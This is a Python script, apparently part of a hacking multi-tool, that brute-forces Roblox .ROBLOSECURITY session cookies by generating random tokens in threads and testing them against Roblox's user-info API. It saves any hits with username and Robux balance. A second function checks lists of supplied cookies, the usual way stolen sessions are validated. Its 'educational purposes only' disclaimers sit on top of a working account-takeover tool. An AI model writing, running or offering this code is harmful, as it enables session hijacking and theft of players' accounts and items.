from Config.Util import *
from Config.Config import *
try:
    import requests
    import json
    import random
    import string
    import threading
except Exception as e:
    ErrorModule(e)

Title("Roblox Cookie Generator")

try:
    def generate_roblox_cookie():
        """Generate potential Roblox cookie format"""
        # Roblox cookies typically follow a specific format
        # This is for educational purposes only
        
        # Generate random cookie parts (simplified format)
        part1 = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        part2 = ''.join(random.choices(string.ascii_letters + string.digits + '_-', k=32))
        part3 = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        cookie = f"_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_{part1}_{part2}_{part3}"
        
        return cookie

    def validate_roblox_cookie(cookie):
        """Validate if a Roblox cookie is working"""
        try:
            response = requests.get(
                "https://www.roblox.com/mobileapi/userinfo", 
                cookies={".ROBLOSECURITY": cookie}, 
                timeout=10
            )
            
            if response.status_code == 200:
                try:
                    user_data = response.json()
                    username = user_data.get('UserName', 'Unknown')
                    user_id = user_data.get('UserID', 'Unknown')
                    robux = user_data.get('RobuxBalance', 'Unknown')
                    return True, username, user_id, robux
                except:
                    return False, None, None, None
            else:
                return False, None, None, None
        except:
            return False, None, None, None

    def cookie_bruteforce():
        """Attempt to bruteforce valid cookies (educational purposes)"""
        attempts = 0
        valid_cookies = []
        
        while True:
            attempts += 1
            cookie = generate_roblox_cookie()
            
            is_valid, username, user_id, robux = validate_roblox_cookie(cookie)
            
            if is_valid:
                valid_cookies.append({
                    'cookie': cookie,
                    'username': username,
                    'user_id': user_id,
                    'robux': robux
                })
                print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Valid cookie found!")
                print(f"    Username: {white}{username}")
                print(f"    User ID: {white}{user_id}")
                print(f"    Robux: {white}{robux}")
                print(f"    Cookie: {white}{cookie[:50]}...")
                
                # Save valid cookie
                cookie_file = os.path.join(tool_path, "1-Output", "RobloxCookies", f"valid_cookie_{user_id}.txt")
                os.makedirs(os.path.dirname(cookie_file), exist_ok=True)
                
                with open(cookie_file, 'w') as f:
                    f.write(f"# Valid Roblox Cookie Found\n")
                    f.write(f"# Date: {current_time_day_hour()}\n")
                    f.write(f"# Username: {username}\n")
                    f.write(f"# User ID: {user_id}\n")
                    f.write(f"# Robux: {robux}\n\n")
                    f.write(f"{cookie}\n")
                
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Cookie saved to: {white}{cookie_file}")
            else:
                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Invalid cookie (attempt {white}{attempts}{red})")
            
            if attempts % 100 == 0:
                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Attempts: {white}{attempts}{red}, Valid: {white}{len(valid_cookies)}")

    def cookie_checker():
        """Check a list of cookies for validity"""
        cookie_input = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Cookie file path or single cookie -> {reset}")
        
        cookies_to_check = []
        
        if os.path.exists(cookie_input):
            # Read from file
            try:
                with open(cookie_input, 'r') as f:
                    cookies_to_check = [line.strip() for line in f if line.strip() and not line.startswith('#')]
            except Exception as e:
                print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} Error reading file: {white}{e}")
                Continue()
                Reset()
        else:
            # Single cookie
            cookies_to_check = [cookie_input]
        
        print(f"{BEFORE + current_time_hour() + AFTER} {WAIT} Checking {white}{len(cookies_to_check)}{red} cookies...")
        
        valid_count = 0
        invalid_count = 0
        
        for i, cookie in enumerate(cookies_to_check, 1):
            is_valid, username, user_id, robux = validate_roblox_cookie(cookie)
            
            if is_valid:
                valid_count += 1
                print(f"{BEFORE_GREEN + current_time_hour() + AFTER_GREEN} {GEN_VALID} Cookie {white}{i}{green}: Valid - {username} (ID: {user_id}, Robux: {robux})")
            else:
                invalid_count += 1
                print(f"{BEFORE + current_time_hour() + AFTER} {GEN_INVALID} Cookie {white}{i}{red}: Invalid")
        
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Results: {white}{valid_count}{red} valid, {white}{invalid_count}{red} invalid")

    print(f"""
 {BEFORE}01{AFTER}{white} Generate and test cookies (bruteforce)
 {BEFORE}02{AFTER}{white} Check existing cookies
 {BEFORE}03{AFTER}{white} Cookie format information
    """)

    choice = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Option -> {reset}")
    
    if choice in ['1', '01']:
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} {yellow}Warning: This process can take a very long time")
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} {yellow}This is for educational purposes only")
        
        confirm = input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Continue? (y/n) -> {reset}")
        if confirm.lower() in ['y', 'yes']:
            try:
                threads_number = int(input(f"{BEFORE + current_time_hour() + AFTER} {INPUT} Threads (recommended: 5-10) -> {reset}"))
            except:
                threads_number = 5
            
            def threaded_bruteforce():
                cookie_bruteforce()
            
            threads = []
            for _ in range(threads_number):
                t = threading.Thread(target=threaded_bruteforce)
                t.start()
                threads.append(t)
            
            try:
                for t in threads:
                    t.join()
            except KeyboardInterrupt:
                print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Bruteforce stopped by user")
    
    elif choice in ['2', '02']:
        cookie_checker()
    
    elif choice in ['3', '03']:
        print(f"""
{BEFORE + current_time_hour() + AFTER} {INFO} Roblox Cookie Format Information:

Roblox cookies (.ROBLOSECURITY) typically follow this format:
_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_[TOKEN]

Where [TOKEN] is a base64-encoded string containing:
- User session information
- Authentication tokens
- Expiration data

{yellow}Security Notes:
- Never share your Roblox cookie
- Cookies can be used to hijack accounts
- Always log out from shared computers
- Enable 2FA for additional security

{red}Legal Warning:
- Using someone else's cookie without permission is illegal
- This tool is for educational purposes only
- Always respect others' privacy and security
        """)
    
    else:
        ErrorChoice()

    Continue()
    Reset()
except Exception as e:
    Error(e)